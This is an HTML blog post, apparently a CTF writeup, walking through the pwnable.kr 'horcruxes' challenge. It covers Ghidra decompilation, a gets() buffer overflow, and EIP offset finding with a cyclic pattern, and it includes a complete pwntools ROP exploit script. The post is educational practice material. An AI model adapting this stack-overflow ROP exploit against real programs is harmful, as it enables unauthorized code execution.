@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+            --font-size: 1.1rem;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>pwnable.kr horcruxes - writeup</title>
+    <meta name="description" content="Play this challenge at pwnable.kr: https://pwnable.kr/play.php
+Instructions Voldemort concealed his splitted soul inside 7 horcruxes. Find all horcruxes, and …">
+    <meta name="keywords" content='pwnable.kr, ctf, pwn'>
+
+    <meta property="og:url" content="http://localhost:1313/posts/pwnable.kr-horcruxes-writeup/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="pwnable.kr horcruxes - writeup">
+    <meta property="og:description" content="Play this challenge at pwnable.kr: https://pwnable.kr/play.php
+Instructions Voldemort concealed his splitted soul inside 7 horcruxes. Find all horcruxes, and …">
+    <meta property="og:image" content="http://localhost:1313/images/avatar.jpg">
+    <meta property="og:image:secure_url" content="http://localhost:1313/images/avatar.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="pwnable.kr horcruxes - writeup">
+    <meta name="twitter:description" content="Play this challenge at pwnable.kr: https://pwnable.kr/play.php
+Instructions Voldemort concealed his splitted soul inside 7 horcruxes. Find all horcruxes, and …">
+    <meta property="twitter:domain" content="http://localhost:1313/posts/pwnable.kr-horcruxes-writeup/">
+    <meta property="twitter:url" content="http://localhost:1313/posts/pwnable.kr-horcruxes-writeup/">
+    <meta name="twitter:image" content="http://localhost:1313/images/avatar.jpg">
+
+    
+    <link rel="canonical" href="http://localhost:1313/posts/pwnable.kr-horcruxes-writeup/">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.a036ebe92c17ea3f0c07761c2135b82bec6f37c8efb7f49ddad1f28c22fc4769.js" integrity="sha256-oDbr6SwX6j8MB3YcITW4K&#43;xvN8jvt/Sd2tHyjCL8R2k="></script>
+
+    
+    
+</head>
+<body>
+        <script>
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="http://localhost:1313/">
+                <img src='/images/avatar.jpg' alt="avatar">
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="http://localhost:1313/">pwnyz</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/" aria-label="" ><span data-feather='home'></span> Home </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/posts/" aria-label="" ><span data-feather='book'></span> Posts </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                <a aria-hidden="true" role="switch">
+                    <span class="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+                <a aria-checked="false" aria-labelledby="hamburger-menu-toggle" id="hamburger-menu-toggle-target" role="switch">
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/" ><span data-feather='home'></span> Home </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/posts/" ><span data-feather='book'></span> Posts </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                    <a role="switch">
+                        <span class="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>pwnable.kr horcruxes - writeup</h1>
+
+        
+
+        
+	
+	
+	
+	
+        
+
+	
+
+	
+
+	
+          <small role="doc-subtitle"></small>
+	
+
+	
+          <p class="post-date">
+              
+
+              18 October 2025
+
+              
+          </p>
+	
+
+        <ul class="post-tags">
+          
+           
+             <li class="post-tag"><a href="http://localhost:1313/tags/pwnable.kr">pwnable.kr</a></li>
+           
+         
+           
+             <li class="post-tag"><a href="http://localhost:1313/tags/ctf">ctf</a></li>
+           
+         
+           
+             <li class="post-tag"><a href="http://localhost:1313/tags/pwn">pwn</a></li>
+           
+         
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>Play this challenge at pwnable.kr: <a href="https://pwnable.kr/play.php">https://pwnable.kr/play.php</a></p>
+<p><img src="img/main.png" alt="Main"></p>
+<h1 id="instructions">Instructions</h1>
+<blockquote>
+<p>Voldemort concealed his splitted soul inside 7 horcruxes.
+Find all horcruxes, and ROP it!
+author: jiwon choi</p>
+<p>ssh <a href="mailto:horcruxes@pwnable.kr">horcruxes@pwnable.kr</a> -p2222 (pw:guest)</p>
+</blockquote>
+<h1 id="provided-files">Provided Files</h1>
+<h2 id="readme">readme</h2>
+<pre tabindex="0"><code>connect to port 9032 (nc 0 9032). the &#39;horcruxes&#39; binary will be executed under horcruxes_pwn privilege.
+rop it to read the flag.
+</code></pre><h1 id="walkthrough">Walkthrough</h1>
+<h2 id="lay-of-the-land">Lay of the land</h2>
+<p>Upon SSH-ing to the challenge and running the binary, it looks like we are able to provide some input to the program.</p>
+<p><img src="img/initialrun.png" alt="Initial run"></p>
+<p>There isn&rsquo;t much else to go by - no source code. Lets disassemble and decompile the binary in Ghidra.</p>
+<p><img src="img/decompiled-main.png" alt="Decompiled Main function"></p>
+<p>We see in the decomipled C code that the program runs 1. <code>hint()</code> -&gt; 2. <code>init_ABCDEFG()</code> -&gt; 3. <code>ropme()</code>.</p>
+<h4 id="decompiled-hint">Decompiled hint()</h4>
+<p><img src="img/decompiled-hint.png" alt="Decompiled hint()"></p>
+<p><code>hint()</code> simply prints out some text. Uninteresting.</p>
+<h4 id="decompiled-initabcdefg">Decompiled initABCDEFG()</h4>
+<p><img src="img/decompiled-init_ABCDEFG.png" alt="Decompiled hint()"></p>
+<p><code>init_ABCDEFG()</code> is assigning random values to the global variables <code>a</code>, <code>b</code>, <code>c</code>, <code>d</code>, <code>e</code>, <code>f</code>, <code>g</code>.</p>
+<h4 id="decompiled-ropme">Decompiled ropme()</h4>
+<p><img src="img/decompiled-ropme.png" alt="Decompiled hint()"></p>
+<p><code>ropme()</code> is doing some comparisons agains the random variables <code>a-g</code> and running the functions <code>A()</code> - <code>G()</code>. We cant run them normally because <code>a-g</code> are random and we dont know their values. In the final <code>else()</code> branch, the program uses <code>gets()</code> (!! vulnerable to buffer overflow) to take the final &ldquo;EXP&rdquo; value and compares it to <code>sum</code> which is a sum of the random vars <code>a-g</code>. If the provided &ldquo;EXP&rdquo; is correct ( = <code>sum</code>), then we get the flag.</p>
+<h4 id="decompiled-a---g">Decompiled A() - G()</h4>
+<p><img src="img/decompiled-A.png" alt="Decompiled A()"></p>
+<p>Looking at decompiled <code>A()</code> - <code>G()</code>, we find that the function prints out the random value of <code>a-g</code> respectively.</p>
+<h2 id="approach-to-pwn">Approach to pwn</h2>
+<p>Using the vulnerable <code>gets()</code> in <code>ropme()</code>, we should be able to overwrite the stack to control <strong>EIP</strong> to run <code>A()</code> - <code>G()</code> to get the values of <code>a-g</code>, then re-run <code>ropme()</code> to provide the correct <code>sum</code> to get the flag.</p>
+<h2 id="constructing-the-payload">Constructing the payload</h2>
+<p>To start constructing the payload, we need the offset to control <strong>EIP</strong>. Lets create a cyclic string and use gdb to test offset.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/pwnable.kr/horcruxes<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3         
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> or <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; from pwn import cyclic
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; cyclic<span style="color:#f92672">(</span>200<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#39;</span>
+</span></span></code></pre></div><p><img src="img/gdb-offset-test.png" alt="GDB Offset Test"></p>
+<p>So we now know that we can overwrite <strong>EIP</strong> by placing our bytes in place of &ldquo;XXXX&rdquo; in the following payload:</p>
+<pre tabindex="0"><code>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfXXXX
+</code></pre><p>Also, by consecutively placing memory locations past &ldquo;XXXX&rdquo;, we control the next, and the next <strong>EIP</strong>.</p>
+<p>Very simplified exlanation: When program enters a function, it stores the <strong>EIP</strong> (i.e. pointer to memory where execution shall recommence after the function finishes) on the stack. Like a bookmark. When a function finishes, the bookmarked <strong>EIP</strong> is popped off the stack and back into <strong>EIP</strong> register, which tells the computer to go back to the bookmarked &ldquo;next&rdquo; instruction that was stored before the function was called. This happens recursively when functions are called within functions within functions, meaning &ldquo;bookmarks&rdquo; are stored next to eachother on the stack (given no inputs are parsed to <code>A()</code> - <code>G()</code>).</p>
+<p>Here&rsquo;s a prompt for your favourite LLM to learn more about this: <code>how does a program know where to recommence execution after a function is finished in assembly? EIP stored on stack</code>.</p>
+<p>So now, we just need to find the addresses of <code>A()</code> - <code>G()</code>  and <code>ropme()</code> to put into our payload. You can do this by looking at your Ghidra disassembly, using gdb to disassemble the functions etc..</p>
+<h2 id="solution">Solution</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0804129d</span>)
+</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080412cf</span>)
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08041301</span>)
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08041333</span>)
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08041365</span>)
+</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08041397</span>)
+</span></span><span style="display:flex;"><span>g <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080413c9</span>)
+</span></span><span style="display:flex;"><span>ropme_addr <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0804150b</span>)
+</span></span><span style="display:flex;"><span>sh <span style="color:#f92672">=</span> ssh(<span style="color:#e6db74">&#39;asm&#39;</span>, <span style="color:#e6db74">&#39;pwnable.kr&#39;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;guest&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">2222</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> sh<span style="color:#f92672">.</span>remote(<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#ae81ff">9032</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabf&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> a<span style="color:#f92672">+</span>b<span style="color:#f92672">+</span>c<span style="color:#f92672">+</span>d<span style="color:#f92672">+</span>e<span style="color:#f92672">+</span>f<span style="color:#f92672">+</span>g<span style="color:#f92672">+</span>ropme_addr
+</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Select Menu:&#34;</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;sent: </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>By running the above, <code>A()</code> - <code>G()</code> will be run, enabling us to see the values <code>a-g</code>. We can simply calculate the sum (eg using Python in terminal) and provide it to the program.</p>
+<p><img src="img/solution.png" alt="Solution"></p>
+
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+
+    
+    
+        <svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top">
+    
+    <path d="M177 159.7l136 136c9.4 9.4 9.4 24.6 0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9 0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9 0L7 329.7c-9.4-9.4-9.4-24.6 0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/>
+</svg>
+<script>
+    let backToTopButton = document.getElementById("btt-button");
+
+    window.onscroll = function() {
+        scrollFunction()
+    };
+
+    function scrollFunction() {
+        if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+            backToTopButton.style.display = "block";
+        } else {
+            backToTopButton.style.display = "none";
+        }
+    }
+
+    function scrollToTop() {
+        window.scrollTo(0, 0);
+    }
+</script>
+
+    
+    
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#instructions">Instructions</a></li>
+    <li><a href="#provided-files">Provided Files</a>
+      <ul>
+        <li><a href="#readme">readme</a></li>
+      </ul>
+    </li>
+    <li><a href="#walkthrough">Walkthrough</a>
+      <ul>
+        <li><a href="#lay-of-the-land">Lay of the land</a>
+          <ul>
+            <li></li>
+          </ul>
+        </li>
+        <li><a href="#approach-to-pwn">Approach to pwn</a></li>
+        <li><a href="#constructing-the-payload">Constructing the payload</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+
+    
+
+    
+
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/gokarna-theme/gokarna-hugo">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
